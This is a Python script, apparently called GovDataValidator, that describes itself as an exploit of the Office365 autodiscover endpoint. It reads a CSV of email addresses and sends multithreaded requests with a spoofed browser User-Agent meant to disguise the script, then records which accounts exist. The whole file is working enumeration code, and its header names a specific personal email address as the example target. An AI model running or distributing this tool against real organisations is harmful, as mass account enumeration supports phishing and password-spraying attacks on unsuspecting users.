#!/usr/bin/env python3

######################################################
#                Administrative Data                 #
######################################################
__title__       = "GovDataValidator"
__description__ = '''This exploit takes advantage of an Azure feature which allows Office365 instances to discover each other's email addresses'''
__example__     = "https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/rjamison6@gatech.edu?Protocol=Autodiscoverv1"
__author__      = "Robert G. Jamison"
__copyright__   = "Copyright 2021"

__license__     = '''"MIT License" - Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''
__version__     = "1.0.1"
__status__      = "Production"

######################################################
#                  import modules                    #
######################################################
import os
import sys
import getopt
import pandas
import requests
import concurrent.futures
from os.path import exists

######################################################
#                       CLASSES                      #
######################################################

# Checks one email at a time against the URL.
def email_checker(i, email):
    headers={                                       # custom "requests" header so we don't look like Python3
        "User-Agent" : "Mozilla/5.0"
        }
    # Concats the URL using the email input
    url = "https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/" + email + "?Protocol=Autodiscoverv1"
    # Requests the page, which returns a "200" code or something else.  Disabled redirects, as those waste our time.
    response = requests.get(url, headers=headers, allow_redirects=False)
    # if response is good (200 code), return the iteration we are on and the result.
    if response.status_code == 200:
        return i, "good"
    # if response is bad (other code), return the iteration we are on and the result
    else:
        return i, "bad"

class GovDataValidator:

    def __init__(self, path, filename):
        pandas.options.mode.chained_assignment = None
        # set width of the get_terminal_size
        self.width = os.get_terminal_size()[0]
        # establish pathing
        self.path = path
        self.filename = path + filename
        if filename[-4] == ".":
            self.file_name = filename[:-4]
            self.format = filename[-4:]
        else:
            self.file_name = filename[:-5]
            self.format = filename[-5]
        self.backup_filename = self.path + self.file_name + "_backup" + self.format
        self.result_filename = self.path + self.file_name + "_result" + self.format

    def import_emails(self, use_backup):
        # Use the backup file autosave feature
        self.use_backup = use_backup
        # Notify the user that we are building a pandas table
        self.msg("Preparing e-mail list.")
        self.list_start = 0
        # if a backup file should be used
        if self.use_backup == True and exists(self.backup_filename):
            # notify the User
            print("+ Using backup file.")
            # import the backup as a pandas table
            self.df = pandas.read_csv(self.backup_filename, low_memory = False)
            print("  - Searching for last starting point within", len(self.df.index), "rows." )
            for i in range(0,len(self.df.index)):
                if self.df["Status"][i] == "UNKNOWN":
                    print("  - Found. Starting on row", i)
                    self.list_start = i
                    break
        # import the new file
        else:
            print("+ Starting from scratch.")
            # import the file as a pandas table
            self.df = pandas.read_csv(self.filename, low_memory = False)
            named = [False, 0]
            for header in list(self.df):
                if "Emails" in header:
                    named[0] = True
                elif "mail" in header:
                    named[1] = self.df.columns.get_loc(header)
            if named[0] == False:
                # rename the only column to "Emails"
                self.df.columns.values[named[1]] = "Emails"
            # create a column so we can add a "status" for each email after processing
            self.df = self.df.assign(Status="UNKNOWN")

        # determine the length of the list
        self.list_end = len(self.df.index)
        self.list_duration = 0
        for status in self.df["Status"]:
            if status == "UNKNOWN":
                self.list_duration += 1

    def msg(self, message):
        print()
        print("=" * self.width)
        print(message)
        print("=" * self.width)
        print()
        return

    def email_enumerator(self, autosave, workers):
        # number of emails to check before autosaving
        self.autosave = autosave
        # calculate: treads per CPU * CPUs = workers
        # Notify the user that we finished importing into pandas
        self.msg("Testing the e-mails.  This part takes a while.")
        # initialize the counter variables
        count = []
        good  = 0
        bad   = 0
        # create an thread pool executor
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            # run each email address through the "email_checker()" method via the executor until we run out.
            #threads = [executor.submit(email_checker, i, df["Emails"][i]) for i in range(list_start,list_end)]
            threads = []
            for i in range(self.list_start,self.list_end):
                if self.df["Status"][i] == "UNKNOWN":
                    threads.append(executor.submit(email_checker, i, self.df["Emails"][i]))
            # For each completed instance we created as a thread via the executor
            for instance in concurrent.futures.as_completed(threads):
                count.append(instance)
                # save the iteration # and the results
                i, result = instance.result()
                # if results are good
                if result == "good":
                    # update the status as "Good" in the pandas table
                    self.df["Status"][i] = "GOOD"
                    # bump up the counter
                    good += 1
                # if results are bad
                elif result == "bad":
                    # update the status as "Bad" in the pandas table
                    self.df["Status"][i] = "BAD"
                    # bump up the counter
                    bad  += 1
                # if something unexpected happens
                else:
                    # leave gracefully
                    print("ERROR")
                    exit(0)
                # Create a string with the totals
                totals = "Completed " + str(len(count)) + " of " + str(self.list_duration) + " | "
                # Create a string with the number of good emails
                good_msg = "Good found: " + str(good) + " | "
                # Create a string with the number of bad emails
                bad_msg = "Bad found: " + str(bad)
                # Print the totals, good, and bad strings, overwriting each as we progress
                print(totals, good_msg, bad_msg, sep=' ', end="\r")
                # if we hit the autosave number
                if len(count) % self.autosave == 0:
                    # save the backup
                    self.df.to_csv(self.backup_filename, index=False)
        # save the results for the report
        self.count = count
        self.good = good
        self.bad = bad
        return

    def final_report(self):
        # Notify the user that we are done and give the final results
        print()
        print(str(self.list_end), "e-mails have been checked.")
        print(str(self.good), "were valid emails")
        print(str(self.bad), "were invalid emails")
        print("Saving results as '" + self.result_filename + "'")
        # output the results to a csv
        self.df.to_csv(self.result_filename, index=False)

######################################################
#                        MAIN                        #
######################################################
def main(argv):
    path = ""
    filename = ""
    use_backup = False
    autosave = 5000
    workers = 50

    help = """
    █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
    █   ▄▄█▀▀▀█▄█                    ▀███▀▀▀██▄           ██            █
    █ ▄██▀     ▀█                      ██    ▀██▄         ██            █
    █ ██▀       ▀  ▄██▀██▄▀██▀   ▀██▀  ██     ▀██▄█▀██▄ ██████ ▄█▀██▄   █
    █ ██          ██▀   ▀██ ██   ▄█    ██      ███   ██   ██  ██   ██   █
    █ ██▄    ▀██████     ██  ██ ▄█     ██     ▄██▄█████   ██   ▄█████   █
    █ ▀██▄     ██ ██▄   ▄██   ███      ██    ▄██▀█   ██   ██  ██   ██   █
    █   ▀▀███████  ▀█████▀     █     ▄████████▀ ▀████▀██▄ ▀████████▀██▄ █
    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
    ██████████ ███ █ ▄▄▀██ ████▄ ▄██ ▄▄▀█ ▄▄▀█▄▄ ▄▄██ ▄▄▄ ██ ▄▄▀█████████
    ███████████ █ ██ ▀▀ ██ █████ ███ ██ █ ▀▀ ███ ████ ███ ██ ▀▀▄█████████
    ███████████▄▀▄██ ██ ██ ▀▀ █▀ ▀██ ▀▀ █ ██ ███ ████ ▀▀▀ ██ ██ █████████
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    \n""" + sys.argv[0] + " -p <path> -f <csv_filename> -b <backup_every_n_emails> -w <workers_per_CPU> "
    try:
        opts, args = getopt.getopt(argv,"hp:f:b:w:")
    except getopt.GetoptError:
        print(help)
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print(help)
            sys.exit()
        elif opt in ("-p"):
            path = arg
            if path[-1:] != "/":
                path = path + "/"
        elif opt in ("-f"):
            filename = arg
        elif opt in ("-b"):
            use_backup = True
            autosave = int(arg)
        elif opt in ("-w"):
            workers = int(arg)

    # test for GovDataValidator
    test = GovDataValidator(path, filename)
    test.import_emails(use_backup)
    test.email_enumerator(autosave, workers)
    test.final_report()

if __name__ == "__main__":
   main(sys.argv[1:])
